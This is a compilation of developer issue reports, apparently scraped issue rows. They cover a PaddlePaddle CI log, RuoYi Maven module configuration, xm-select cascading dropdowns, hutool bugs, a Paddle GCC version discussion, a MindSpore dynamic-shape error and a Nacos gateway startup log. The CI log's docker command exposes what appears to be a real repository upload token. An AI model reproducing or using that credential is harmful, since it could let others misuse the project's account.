[13:30:13] [Step 1/1] [13:30:13] [Step 1/1] PID: 25343, PPID: 17727, Command line: docker run -i --rm -v /home/baidu/BuildAgent/work/eb2641a9d9041b16:/paddle -v /root/.cache:/root/.cache -e FLAGS_fraction_of_gpu_memory_to_use=0.15 -e CTEST_OUTPUT_ON_FAILURE=1 -e CTEST_PARALLEL_LEVEL=5 -e APT_MIRROR=s#http://archive.ubuntu.com/ubuntu#mirror://mirrors.ubuntu.com/mirrors.txt#g -e WITH_GPU=ON -e CUDA_ARCH_NAME=Auto -e WITH_AVX=ON -e WITH_GOLANG=ON -e WITH_TESTING=ON -e WITH_C_API=OFF -e CMAKE_BUILD_TYPE=RelWithDebInfo -e WITH_COVERAGE=ON -e COVERALLS_UPLOAD=ON -e GIT_PR_ID=9553 -e JSON_REPO_TOKEN=JSUOs6TF6fD2i30OJ5o2S55V8XWv6euen -e WITH_DEB=OFF -e PADDLE_VERSION=0.10.0 -e PADDLE_FRACTION_GPU_MEMORY_TO_USE=0.15 -e CUDA_VISIBLE_DEVICES=0,1 -e RUN_TEST=ON --device=/dev/nvidiactl --device=/dev/nvidia-uvm --device=/dev/nvidia-uvm-tools --device=/dev/nvidia0 --device=/dev/nvidia1 --device=/dev/nvidia2 --device=/dev/nvidia3 --device=/dev/nvidia4 --device=/dev/nvidia5 --volume=nvidia_driver_390.25:/usr/local/nvidia:ro paddlepaddle/paddle:dev [13:30:13] [Step 1/1] Failed to locate jps tool. No thread dump information is available [13:30:13] [Step 1/1] [13:30:13] [Step 1/1] PID: 17643, PPID: 5657, Command line: perl /home/baidu/BuildAgent/system/perfmon/scripts/vmstatlinux.pl /home/baidu/BuildAgent/system/perfmon/temp/perfmon.csv 1000 [13:30:13] [Step 1/1] Failed to locate jps tool. No thread dump information is available [13:30:13] [Step 1/1] [13:30:13] [Step 1/1] PID: 17647, PPID: 17643, Command line: vmstat 1 [13:30:13] [Step 1/1] Failed to locate jps tool. No thread dump information is available [13:30:13] [Step 1/1] [13:30:13] [Step 1/1] Process exited with code 137 [13:30:13] [Step 1/1] Process exited with code 137 [13:30:13] [Step 1/1] Step Build and test (Command Line) interrupted [13:30:13] Failed to start process to monitor system performance. Performance monitoring data will not be available. [13:30:13] Publishing artifacts"
新建了 包含Controller类的模块，报404错误,"新建了 包含Controller类的模块，报404错误 新加的模块的pom 文件 不知道哪里错了，请大佬指点   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd""&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi&lt;/artifactId&gt; &lt;version&gt;4.6.2&lt;/version&gt; &lt;name&gt;ruoyi&lt;/name&gt; &lt;url&gt;http://www.ruoyi.vip&lt;/url&gt; &lt;description&gt;若依管理系统&lt;/description&gt; &lt;properties&gt; &lt;ruoyi.version&gt;4.6.2&lt;/ruoyi.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;maven-jar-plugin.version&gt;3.1.1&lt;/maven-jar-plugin.version&gt; &lt;shiro.version&gt;1.7.1&lt;/shiro.version&gt; &lt;thymeleaf.extras.shiro.version&gt;2.0.0&lt;/thymeleaf.extras.shiro.version&gt; &lt;druid.version&gt;1.2.6&lt;/druid.version&gt; &lt;bitwalker.version&gt;1.21&lt;/bitwalker.version&gt; &lt;kaptcha.version&gt;2.3.2&lt;/kaptcha.version&gt; &lt;swagger.version&gt;3.0.0&lt;/swagger.version&gt; &lt;mybatis-spring-boot.version&gt;2.1.4&lt;/mybatis-spring-boot.version&gt; &lt;pagehelper.boot.version&gt;1.3.1&lt;/pagehelper.boot.version&gt; &lt;fastjson.version&gt;1.2.76&lt;/fastjson.version&gt; &lt;oshi.version&gt;5.8.0&lt;/oshi.version&gt; &lt;jna.version&gt;5.8.0&lt;/jna.version&gt; &lt;commons.io.version&gt;2.11.0&lt;/commons.io.version&gt; &lt;commons.fileupload.version&gt;1.4&lt;/commons.fileupload.version&gt; &lt;poi.version&gt;4.1.2&lt;/poi.version&gt; &lt;velocity.version&gt;1.7&lt;/velocity.version&gt; &lt;!-- 文件拷贝时的编码 --&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;!-- 编译时的编码 --&gt; &lt;maven.compiler.encoding&gt;UTF-8&lt;/maven.compiler.encoding&gt; &lt;/properties&gt; &lt;!-- 依赖声明 --&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!-- SpringBoot的依赖配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.2.13.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- 阿里数据库连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 验证码 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.penggle&lt;/groupId&gt; &lt;artifactId&gt;kaptcha&lt;/artifactId&gt; &lt;version&gt;${kaptcha.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Shiro核心框架 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;${shiro.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Shiro使用Spring框架 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt; &lt;version&gt;${shiro.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Shiro使用EhCache缓存框架 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt; &lt;version&gt;${shiro.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- thymeleaf模板引擎和shiro框架的整合 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.theborakompanioni&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-extras-shiro&lt;/artifactId&gt; &lt;version&gt;${thymeleaf.extras.shiro.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 解析客户端操作系统、浏览器等 --&gt; &lt;dependency&gt; &lt;groupId&gt;eu.bitwalker&lt;/groupId&gt; &lt;artifactId&gt;UserAgentUtils&lt;/artifactId&gt; &lt;version&gt;${bitwalker.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- SpringBoot集成mybatis框架 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- pagehelper 分页插件 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt; &lt;artifactId&gt;pagehelper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${pagehelper.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 获取系统信息 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.oshi&lt;/groupId&gt; &lt;artifactId&gt;oshi-core&lt;/artifactId&gt; &lt;version&gt;${oshi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna&lt;/artifactId&gt; &lt;version&gt;${jna.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.java.dev.jna&lt;/groupId&gt; &lt;artifactId&gt;jna-platform&lt;/artifactId&gt; &lt;version&gt;${jna.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Swagger3依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt; &lt;version&gt;${swagger.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;io.swagger&lt;/groupId&gt; &lt;artifactId&gt;swagger-models&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- io常用工具类 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;${commons.io.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 文件上传工具类 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;/groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt; &lt;version&gt;${commons.fileupload.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- excel工具 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt; &lt;version&gt;${poi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- velocity代码生成使用模板 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity&lt;/artifactId&gt; &lt;version&gt;${velocity.version}&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 阿里JSON解析器 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;${fastjson.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 定时任务--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-quartz&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 代码生成--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-generator&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 核心模块--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-framework&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 系统模块--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-system&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 通用工具--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-common&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 手环功能--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;zeyou-sdms&lt;/artifactId&gt; &lt;version&gt;${ruoyi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;modules&gt; &lt;module&gt;ruoyi-admin&lt;/module&gt; &lt;module&gt;ruoyi-framework&lt;/module&gt; &lt;module&gt;ruoyi-system&lt;/module&gt; &lt;module&gt;ruoyi-quartz&lt;/module&gt; &lt;module&gt;ruoyi-generator&lt;/module&gt; &lt;module&gt;ruoyi-common&lt;/module&gt; &lt;module&gt;zeyou-sdms&lt;/module&gt; &lt;/modules&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;dependencies&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;encoding&gt;${project.build.sourceEncoding}&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;public&lt;/id&gt; &lt;name&gt;aliyun nexus&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;public&lt;/id&gt; &lt;name&gt;aliyun nexus&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/project&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd""&gt; &lt;parent&gt; &lt;artifactId&gt;ruoyi&lt;/artifactId&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;version&gt;4.6.2&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;artifactId&gt;ruoyi-admin&lt;/artifactId&gt; &lt;description&gt; web服务入口 &lt;/description&gt; &lt;dependencies&gt; &lt;!-- SpringBoot集成thymeleaf模板 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;!-- 表示依赖不会传递 --&gt; &lt;/dependency&gt; &lt;!-- swagger3--&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.swagger&lt;/groupId&gt; &lt;artifactId&gt;swagger-models&lt;/artifactId&gt; &lt;version&gt;1.6.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mysql驱动包 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 核心模块--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-framework&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 定时任务--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-quartz&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 代码生成--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-generator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;zeyou-sdms&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.1.1.RELEASE&lt;/version&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;!-- 如果没有该配置，devtools不会生效 --&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;configuration&gt; &lt;failOnMissingWebXml&gt;false&lt;/failOnMissingWebXml&gt; &lt;warName&gt;${project.artifactId}&lt;/warName&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;!-- YUI Compressor (CSS/JS压缩) &lt;plugin&gt; &lt;groupId&gt;net.alchim31.maven&lt;/groupId&gt; &lt;artifactId&gt;yuicompressor-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;prepare-package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;compress&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;jswarn&gt;false&lt;/jswarn&gt; &lt;nosuffix&gt;true&lt;/nosuffix&gt; &lt;linebreakpos&gt;50000&lt;/linebreakpos&gt; &lt;sourceDirectory&gt;src/main/resources/static&lt;/sourceDirectory&gt; &lt;force&gt;true&lt;/force&gt; &lt;includes&gt; &lt;include&gt;**/*.js&lt;/include&gt; &lt;include&gt;**/*.css&lt;/include&gt; &lt;/includes&gt; &lt;excludes&gt; &lt;exclude&gt;**/*.min.js&lt;/exclude&gt; &lt;exclude&gt;**/*.min.css&lt;/exclude&gt; &lt;exclude&gt;**/fileinput.js&lt;/exclude&gt; &lt;exclude&gt;**/bootstrap-table/**&lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; --&gt; &lt;/plugins&gt; &lt;finalName&gt;${project.artifactId}&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; &lt;?xml version=""1.0""?&gt; &lt;project xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"" xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi&lt;/artifactId&gt; &lt;version&gt;4.6.2&lt;/version&gt; &lt;/parent&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;zeyou-sdms&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;name&gt;zeyou-sdms&lt;/name&gt; &lt;url&gt;http://maven.apache.org&lt;/url&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- SpringBoot集成thymeleaf模板 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- spring-boot-devtools --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;!-- 表示依赖不会传递 --&gt; &lt;/dependency&gt; &lt;!-- swagger3--&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --&gt; &lt;dependency&gt; &lt;groupId&gt;io.swagger&lt;/groupId&gt; &lt;artifactId&gt;swagger-models&lt;/artifactId&gt; &lt;version&gt;1.6.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mysql驱动包 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 核心模块--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-framework&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 定时任务--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-quartz&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 代码生成--&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-generator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt;"
"xm-select remoteMethod: function(val, cb, show, pageIndex) {}问题","问题需求 有两个下拉列表，第一个下拉选择某个值时，第二个下拉就根据第一个下拉选择的值进行改变，同时两个下拉又拥有远程搜索分页的功能 远程搜索第一启动时有效，之后就没有效果了   <code>: arrName[ele.name] = xmSelect.render({ el: ""#"" + ele.name + ""_block"", radio: true, clickClose: true, model: { icon: 'hidden', label: { type: 'text' } }, name: ele.name, data: [ele.default_value], prop: { name: 'name', value: 'id', }, show() { arrName[ele.name].update({ remoteSearch: true, filterable: true, //开启分页 paging: true, //远程分页 pageRemote: true, remoteMethod: function(val, cb, show, pageIndex) { //val: 搜索框的内容, 不开启搜索默认为空, cb: 回调函数, show: 当前下拉框是否展开, pageIndex: 当前第几页 console.log(val) $.ajax({ url: setter.domain_main + ele.lay_filter, headers: { // 请求头，这里放了一个token AdminToken: token }, data: { page: pageIndex, }, type: ""POST"", success(res2) { //这里是success的处理 var res = res2.data; //回调需要两个参数, 第一个: 数据数组, 第二个: 总页码 cb(res.list, res.pages) }, error: function() { //这里是error的处理 cb([], 0); } }) }, }) }， on: function(data) { var arr = data.arr; var area_id = -1; //启动区域下拉框时，如果没有点击任何值，则堆存位置下拉框暂无数据可以选择 if (arr.length &gt; 0) { area_id = arr[0].id; arrName['area_locat_id'].update({ show() { arrName[ele.name].update({ remoteSearch: true, filterable: true, //开启分页 paging: true, //远程分页 pageRemote: true, remoteMethod: function(val, cb, show, pageIndex) { //val: 搜索框的内容, 不开启搜索默认为空, cb: 回调函数, show: 当前下拉框是否展开, pageIndex: 当前第几页 console.log(val) $.ajax({ url: setter.domain_main + ele.lay_filter, headers: { // 请求头，这里放了一个token AdminToken: token }, data: { page: pageIndex, }, type: ""POST"", success(res2) { //这里是success的处理 var res = res2.data; //回调需要两个参数, 第一个: 数据数组, 第二个: 总页码 cb(res.list, res.pages) }, error: function() { //这里是error的处理 cb([], 0); } }) }, }) } else { arrName['area_locat_id'].update({ show() {}, data: [] }) } } }) }"
ListUtil.split 错误,"JDK版本： 1.8.0_261 hutool版本： 5.7.11 堆栈信息 <ol start=""3"">   <code>: public void testList() { List&lt;String&gt; listAll = new ArrayList&lt;&gt;(); listAll.add(""1""); listAll.add(""2""); List&lt;List&lt;String&gt;&gt; lists = ListUtil.split(listAll, 10); System.out.println(lists); } java.lang.ArithmeticException: / by zero at cn.hutool.core.collection.Partition.size(Partition.java:44) at java.util.AbstractList$Itr.hasNext(AbstractList.java:351) at java.util.AbstractCollection.toString(AbstractCollection.java:455) at java.lang.String.valueOf(String.java:2994) at java.io.PrintStream.println(PrintStream.java:821)"
Hutool-http 需要手动关闭连接吗,JDK版本： openjdk_8_241 hutool版本： 5.3.5 第一种请求方式需要手动关闭连接吗 第二种请求方式需要调用response.close()手动关闭连接吗   <code>: HttpUtil.get(url) HttpResponse response=HttpRequest.post(url).form(params).timeout(20000).execute();
编译Paddle需要的最低GCC版本,"当前Paddle可以用gcc4.6版本来编译，这个ISSUE讨论是否将Paddle最低gcc版本提高gcc4.8。 gcc4.6的一些问题： gcc4.6支持部分c++11语法，比如不支持Type alias, alias template 等； gcc4.6不支持编译选项，只支持编译选项，但是nvcc不支持编译选项；所以nvcc + gcc4.6环境下cuda部分是用不了c++11特性的。 issue #415:""Double requirement given"" problem 问题的根本原因是，nvcc不支持，为了避免参数透传到nvcc，cmake中设置了set(CUDA_PROPAGATE_HOST_FLAGS OFF)，但也导致了Debug或Release的参数也不能自动透传给nvcc。   <code>: -std=c++11 -std=c++0x -std=c++0x -std=c++0x -std=c++0x"
"[CT][MS][ascend]Get infer functions failed, the operator is not support dynamic shape yet, primitive name:SparseApplyProximalAdagradD primitive type:Primitive","Get infer functions failed, the operator is not support dynamic shape yet, primitive name:SparseApplyProximalAdagradD primitive type:Primitive / 硬件环境: /device ascend : -- MindSpore version :master-45123 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_dynamic_shape_hetero_exec_with_sparse_optimizer_proximaladagrad test_dynamic_shape_sparse_gatherv2_with_sparse_optimizer_proximaladagrad pytest -s dynamic_shape/test_dynamic_shape_runtime.py::test_dynamic_shape_sparse_gatherv2_with_sparse_optimizer_proximaladagrad case pass   <code>: &gt; return self._graph_executor(args, phase) E RuntimeError: Get infer functions failed, the operator is not support dynamic shape yet, primitive name:SparseApplyProximalAdagradD primitive type:Primitive E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/backend/common/optimizer/helper.cc:1070 CppInferShape"
docker compose nacos 异常,"请问下docker compose 方式启动 gateway 报异常是什么原因，错误信息如下 只改了 bootstrap.yml 的 nacos 的server-addr为 ruoyi-nacos:8848   <code>: ruoyi-gateway | 11:11:53.571 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [efc2fe2d-e0f0-441a-8bc3-a5ce3df904fb_config-0] Success to connect to server [ruoyi-nacos:8848] on start up,connectionId=1639912313069_172.18.0.5_60762 ruoyi-gateway | 11:11:53.573 [com.alibaba.nacos.client.remote.worker] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [efc2fe2d-e0f0-441a-8bc3-a5ce3df904fb_config-0]Notify connected event to listeners. ruoyi-gateway | 11:11:53.574 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [efc2fe2d-e0f0-441a-8bc3-a5ce3df904fb_config-0]Register server push request handler:com.alibaba.nacos.common.remote.client.RpcClient$ConnectResetRequestHandler ruoyi-gateway | 11:11:53.576 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [efc2fe2d-e0f0-441a-8bc3-a5ce3df904fb_config-0]Register server push request handler:com.alibaba.nacos.common.remote.client.RpcClient$4 ruoyi-gateway | 11:11:53.580 [com.alibaba.nacos.client.remote.worker] INFO c.a.n.c.c.i.ClientWorker - [onConnected,681] - [efc2fe2d-e0f0-441a-8bc3-a5ce3df904fb_config-0] Connected,notify listen context... ruoyi-gateway | 11:11:53.760 [main] INFO c.a.n.c.c.i.Limiter - [&lt;clinit&gt;,56] - limitTime:5.0 ruoyi-gateway | 11:11:53.978 [main] INFO c.a.n.c.c.u.JvmUtil - [&lt;clinit&gt;,53] - isMultiInstance:false ruoyi-gateway | 11:11:54.055 [main] WARN c.a.c.n.c.NacosPropertySourceBuilder - [loadNacosData,87] - Ignore the empty nacos configuration and get it based on dataId[ruoyi-gateway] &amp; group[DEFAULT_GROUP] ruoyi-gateway | 11:11:54.083 [main] WARN c.a.c.n.c.NacosPropertySourceBuilder - [loadNacosData,87] - Ignore the empty nacos configuration and get it based on dataId[ruoyi-gateway.yml] &amp; group[DEFAULT_GROUP] ruoyi-gateway | 11:11:54.165 [main] INFO c.r.g.RuoYiGatewayApplication - [logStartupProfileInfo,663] - The following profiles are active: dev ruoyi-gateway | INFO: Sentinel log output type is: file ruoyi-gateway | INFO: Sentinel log charset is: utf-8 ruoyi-gateway | INFO: Sentinel log base directory is: /root/logs/csp/ ruoyi-gateway | INFO: Sentinel log name use pid is: false ruoyi-gateway | 11:12:05.767 [main] INFO c.a.c.s.g.s.SentinelSCGAutoConfiguration - [sentinelGatewayFilter,144] - 